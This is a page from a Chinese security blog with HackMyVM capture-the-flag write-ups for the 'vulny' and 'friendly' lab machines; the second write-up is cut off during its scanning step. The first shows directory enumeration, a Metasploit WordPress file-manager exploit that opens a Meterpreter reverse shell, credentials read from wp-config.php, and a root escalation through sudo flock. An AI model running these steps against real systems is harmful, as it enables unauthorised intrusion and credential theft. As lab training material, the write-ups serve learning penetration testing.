<h2 id="4-扫目录："><a href="#4-扫目录：" class="headerlink" title="4.扫目录："></a>4.扫目录：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.132          </span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web<span class="literal">-Content</span>/directory<span class="literal">-list-2</span>.<span class="number">3</span><span class="literal">-medium</span>.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">26</span> <span class="number">09</span>:<span class="number">43</span>:<span class="number">09</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/javascript           (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">321</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.132</span>/<span class="type">javascript</span>/]</span><br><span class="line">/secret               (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">317</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.132</span>/<span class="type">secret</span>/]</span><br><span class="line">/server<span class="literal">-status</span>        (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">Progress: <span class="number">220225</span> / <span class="number">220561</span> (<span class="number">99.85</span>%)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">26</span> <span class="number">09</span>:<span class="number">45</span>:<span class="number">39</span> Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p>看一下：</p>
<p><img src="/../pic/image-20230726094904127.png" alt="image-20230726094904127"></p>
<h2 id="5-扫二阶目录"><a href="#5-扫二阶目录" class="headerlink" title="5.扫二阶目录"></a>5.扫二阶目录</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.132/secret</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192.168</span>.<span class="number">56.132</span>/secret</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web<span class="literal">-Content</span>/directory<span class="literal">-list-2</span>.<span class="number">3</span><span class="literal">-medium</span>.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">26</span> <span class="number">09</span>:<span class="number">49</span>:<span class="number">26</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/wp<span class="literal">-content</span>           (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">328</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.132</span>/<span class="type">secret</span>/<span class="type">wp</span>-<span class="type">content</span>/]</span><br><span class="line">/wp<span class="literal">-includes</span>          (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">329</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.132</span>/<span class="type">secret</span>/<span class="type">wp</span>-<span class="type">includes</span>/]</span><br><span class="line">/wp<span class="literal">-admin</span>             (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">326</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.132</span>/<span class="type">secret</span>/<span class="type">wp</span>-<span class="type">admin</span>/]</span><br><span class="line">Progress: <span class="number">220217</span> / <span class="number">220561</span> (<span class="number">99.84</span>%)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">26</span> <span class="number">09</span>:<span class="number">52</span>:<span class="number">01</span> Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h2 id="6-查看一下："><a href="#6-查看一下：" class="headerlink" title="6.查看一下："></a>6.查看一下：</h2><p><img src="/../pic/image-20230726095423137.png" alt="image-20230726095423137"></p>
<h2 id="7-msf上有相关漏洞，试试："><a href="#7-msf上有相关漏洞，试试：" class="headerlink" title="7.msf上有相关漏洞，试试："></a>7.msf上有相关漏洞，试试：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; <span class="built_in">set</span> rhosts <span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; <span class="built_in">set</span> targeturi /secret</span><br><span class="line">targeturi =&gt; /secret</span><br><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">4444</span> </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to disable)</span><br><span class="line">[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. <span class="string">&quot;set ForceExploit true&quot;</span> to override check result.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; <span class="built_in">set</span> ForceExploit true</span><br><span class="line">ForceExploit =&gt; true</span><br><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">4444</span> </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to disable)</span><br><span class="line">[!] Cannot reliably check exploitability. ForceExploit is enabled, proceeding with exploitation.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">56.132</span>:<span class="number">80</span> - Payload is at /secret/wp<span class="literal">-content</span>/plugins/wp<span class="operator">-file</span><span class="literal">-manager</span>/lib/files/<span class="number">4</span>obwHD.php</span><br><span class="line">[*] Sending stage (<span class="number">39927</span> bytes) to <span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">[+] Deleted <span class="number">4</span>obwHD.php</span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span>.<span class="number">56.132</span>:<span class="number">56156</span>) at <span class="number">2023</span><span class="literal">-07-26</span> <span class="number">10</span>:<span class="number">00</span>:<span class="number">50</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="literal">-c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">&lt;ress/wp<span class="literal">-content</span>/plugins/wp<span class="operator">-file</span><span class="literal">-manager</span>/lib/files<span class="variable">$</span> export TERM=xterm</span><br><span class="line">export TERM=xterm</span><br><span class="line">www<span class="literal">-data</span>@vulny:/usr/share/wordpress/wp<span class="literal">-content</span>/plugins/wp<span class="operator">-file</span><span class="literal">-manager</span>/lib/files<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">www<span class="literal">-data</span>@vulny:/usr/share/wordpress/wp<span class="literal">-content</span>/plugins/wp<span class="operator">-file</span><span class="literal">-manager</span>/lib/files<span class="variable">$</span> <span class="built_in">cd</span> /usr/share/wordpress</span><br><span class="line">www<span class="literal">-data</span>@vulny:/usr/share/wordpress<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">index.php           wp<span class="literal">-comments-post</span>.php  wp<span class="literal">-includes</span>        wp<span class="literal">-settings</span>.php</span><br><span class="line">readme.html         wp<span class="literal">-config-sample</span>.php  wp<span class="literal">-links-opml</span>.php  wp<span class="literal">-signup</span>.php</span><br><span class="line">wp<span class="literal">-activate</span>.php     wp<span class="literal">-config</span>.php         wp<span class="literal">-load</span>.php        wp<span class="literal">-trackback</span>.php</span><br><span class="line">wp<span class="literal">-admin</span>            wp<span class="literal">-content</span>            wp<span class="literal">-login</span>.php       xmlrpc.php</span><br><span class="line">wp<span class="literal">-blog-header</span>.php  wp<span class="literal">-cron</span>.php           wp<span class="literal">-mail</span>.php</span><br><span class="line">www<span class="literal">-data</span>@vulny:/usr/share/wordpress<span class="variable">$</span> <span class="built_in">cat</span> wp<span class="literal">-config</span>.php</span><br><span class="line"><span class="built_in">cat</span> wp<span class="literal">-config</span>.php</span><br><span class="line">&lt;?php</span><br><span class="line">/***</span><br><span class="line"> * WordPress<span class="string">&#x27;s Debianised default master config file</span></span><br><span class="line"><span class="string"> * Please do NOT edit and learn how the configuration works in</span></span><br><span class="line"><span class="string"> * /usr/share/doc/wordpress/README.Debian</span></span><br><span class="line"><span class="string"> ***/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* Look up a host-specific config file in</span></span><br><span class="line"><span class="string"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">$debian_server = preg_replace(&#x27;</span>/:.*/<span class="string">&#x27;, &quot;&quot;, $_SERVER[&#x27;</span>HTTP_HOST<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">$debian_server = preg_replace(&quot;/[^a-zA-Z0-9.\-]/&quot;, &quot;&quot;, $debian_server);</span></span><br><span class="line"><span class="string">$debian_file = &#x27;</span>/etc/wordpress/config-<span class="string">&#x27;.strtolower($debian_server).&#x27;</span>.php<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">/* Main site in case of multisite with subdomains */</span></span><br><span class="line"><span class="string">$debian_main_server = preg_replace(&quot;/^[^.]*\./&quot;, &quot;&quot;, $debian_server);</span></span><br><span class="line"><span class="string">$debian_main_file = &#x27;</span>/etc/wordpress/config-<span class="string">&#x27;.strtolower($debian_main_server).&#x27;</span>.php<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (file_exists($debian_file)) &#123;</span></span><br><span class="line"><span class="string">    require_once($debian_file);</span></span><br><span class="line"><span class="string">    define(&#x27;</span>DEBIAN_FILE<span class="string">&#x27;, $debian_file);</span></span><br><span class="line"><span class="string">&#125; elseif (file_exists($debian_main_file)) &#123;</span></span><br><span class="line"><span class="string">    require_once($debian_main_file);</span></span><br><span class="line"><span class="string">    define(&#x27;</span>DEBIAN_FILE<span class="string">&#x27;, $debian_main_file);</span></span><br><span class="line"><span class="string">&#125; elseif (file_exists(&quot;/etc/wordpress/config-default.php&quot;)) &#123;</span></span><br><span class="line"><span class="string">    require_once(&quot;/etc/wordpress/config-default.php&quot;);</span></span><br><span class="line"><span class="string">    define(&#x27;</span>DEBIAN_FILE<span class="string">&#x27;, &quot;/etc/wordpress/config-default.php&quot;);</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">    header(&quot;HTTP/1.0 404 Not Found&quot;);</span></span><br><span class="line"><span class="string">    echo &quot;Neither &lt;b&gt;$debian_file&lt;/b&gt; nor &lt;b&gt;$debian_main_file&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.&quot;;</span></span><br><span class="line"><span class="string">    exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* idrinksomewater */   ####密码</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (isset($_SERVER[&#x27;</span>HTTP_X_FORWARDED_PROTO<span class="string">&#x27;]) &amp;&amp; $_SERVER[&#x27;</span>HTTP_X_FORWARDED_PROTO<span class="string">&#x27;] == &#x27;</span>https<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    $_SERVER[&#x27;</span>HTTPS<span class="string">&#x27;] = &#x27;</span>on<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">require_once(ABSPATH . &#x27;</span>wp<span class="literal">-settings</span>.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">www-data@vulny:/usr/share/wordpress$ su adrain</span></span><br><span class="line"><span class="string">su adrain</span></span><br><span class="line"><span class="string">su: user adrain does not exist</span></span><br><span class="line"><span class="string">www-data@vulny:/usr/share/wordpress$ su adrian</span></span><br><span class="line"><span class="string">su adrian</span></span><br><span class="line"><span class="string">Password: idrinksomewater</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">adrian@vulny:/usr/share<span class="variable">$</span> <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span>: user.txt: No such file or directory</span><br><span class="line">adrian@vulny:/usr/share<span class="variable">$</span> <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">bash: <span class="built_in">cd</span>: home: No such file or directory</span><br><span class="line">adrian@vulny:/usr/share<span class="variable">$</span> <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">adrian@vulny:/usr<span class="variable">$</span> <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">adrian@vulny:/<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin    dev   lib    libx32      mnt   root  snap      sys  var</span><br><span class="line">boot   etc   lib32  lost+found  opt   run   srv       tmp</span><br><span class="line">cdrom  home  lib64  media       proc  sbin  swap.img  usr</span><br><span class="line">adrian@vulny:/<span class="variable">$</span> <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">adrian@vulny:/home<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">adrian</span><br><span class="line">adrian@vulny:/home<span class="variable">$</span> <span class="built_in">cd</span> adrian</span><br><span class="line"><span class="built_in">cd</span> adrian</span><br><span class="line">adrian@vulny:~<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">adrian@vulny:~<span class="variable">$</span> <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">HMViuploadfiles</span><br><span class="line">adrian@vulny:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> adrian on vulny:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User adrian may run the following commands on vulny:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/flock</span><br><span class="line">adrian@vulny:~<span class="variable">$</span> sudo flock <span class="literal">-u</span> root /bin/bash</span><br><span class="line">sudo flock <span class="literal">-u</span> root /bin/bash</span><br><span class="line">root@vulny:/home/adrian<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root  user.txt</span><br><span class="line">root@vulny:/home/adrian<span class="comment"># cd root</span></span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">bash: <span class="built_in">cd</span>: root: Not a directory</span><br><span class="line">root@vulny:/home/adrian<span class="comment"># cd ..</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">root@vulny:/home<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">adrian</span><br><span class="line">root@vulny:/home<span class="comment"># cd ..</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">root@vulny:/<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin    dev   lib    libx32      mnt   root  snap      sys  var</span><br><span class="line">boot   etc   lib32  lost+found  opt   run   srv       tmp</span><br><span class="line">cdrom  home  lib64  media       proc  sbin  swap.img  usr</span><br><span class="line">root@vulny:/<span class="comment"># cd root</span></span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">root@vulny:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line">root@vulny:~<span class="comment"># cat root.txt</span></span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">HMVididit</span><br><span class="line">root@vulny:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/26/vulny/" data-id="clmnr8k0r002lso8gfdc9dop2" data-title="vulny" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msf/" rel="tag">msf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-friendly" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/25/friendly/" class="article-date">
  <time class="dt-published" datetime="2023-07-25T05:55:39.000Z" itemprop="datePublished">2023-07-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/25/friendly/">friendly</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="1-扫描端口服务："><a href="#1-扫描端口服务：" class="headerlink" title="1.扫描端口服务："></a>1.扫描端口服务：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p- 192.168.56.131</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-25</span> <span class="number">14</span>:<span class="number">00</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.131</span></span><br><span class="line">Host is up (<span class="number">0.00048</span>s latency).</span><br><span class="line">Not shown: <span class="number">65531</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT    STATE SERVICE    VERSION</span><br><span class="line"><span class="number">21</span>/tcp  open  ftp        ProFTPD</span><br><span class="line">|_ftp<span class="literal">-bounce</span>: bounce working!</span><br><span class="line">| ftp<span class="literal">-anon</span>: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">|_<span class="literal">-rw-r--r--</span>   <span class="number">1</span> root     root        <span class="number">10725</span> Feb <span class="number">23</span> <span class="number">15</span>:<span class="number">26</span> index.html</span><br><span class="line"><span class="number">25</span>/tcp  open  tcpwrapped</span><br><span class="line">|_smtp<span class="literal">-commands</span>: Couldn<span class="string">&#x27;t establish connection on port 25</span></span><br><span class="line"><span class="string">80/tcp  open  http       Apache httpd 2.4.54 ((Debian))</span></span><br><span class="line"><span class="string">|_http-title: Apache2 Debian Default Page: It works</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.54 (Debian)</span></span><br><span class="line"><span class="string">110/tcp open  tcpwrapped</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 144.87 seconds</span></span><br></pre></td></tr></table></figure>

<h2 id="2-80开放，访问网页："><a href="#2-80开放，访问网页：" class="headerlink" title="2.80开放，访问网页："></a>2.80开放，访问网页：</h2><p><img src="/../pic/image-20230725140642556.png" alt="image-20230725140642556"></p>
<p>只是初始界面：</p>
<h2 id="3-经过探查：可以考虑上传getshell-php"><a href="#3-经过探查：可以考虑上传getshell-php" class="headerlink" title="3.经过探查：可以考虑上传getshell.php"></a>3.经过探查：可以考虑上传getshell.php</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># dirsearch -u http://192.168.56.131/    </span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.2</span>                                                                                                                  </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                           </span><br><span class="line">                                                                                                                                                  </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="number">30</span> | Wordlist size: <span class="number">10927</span></span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/<span class="number">192.168</span>.<span class="number">56.131</span>/<span class="literal">-_23-07-25_14-18-04</span>.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors<span class="literal">-23-07-25_14-18-04</span>.log</span><br><span class="line"></span><br><span class="line">Target: http://<span class="number">192.168</span>.<span class="number">56.131</span>/</span><br><span class="line"></span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">04</span>] Starting: </span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.ht_wsr.txt                                     </span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htaccess.bak1                                  </span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - /.htaccess.orig                                  </span><br><span class="line">[<span class="number">14</span>:<span class="number">18</span>:<span class="number">05</span>] <span class="number">403</span> -  <span class="number">279</span>B  - 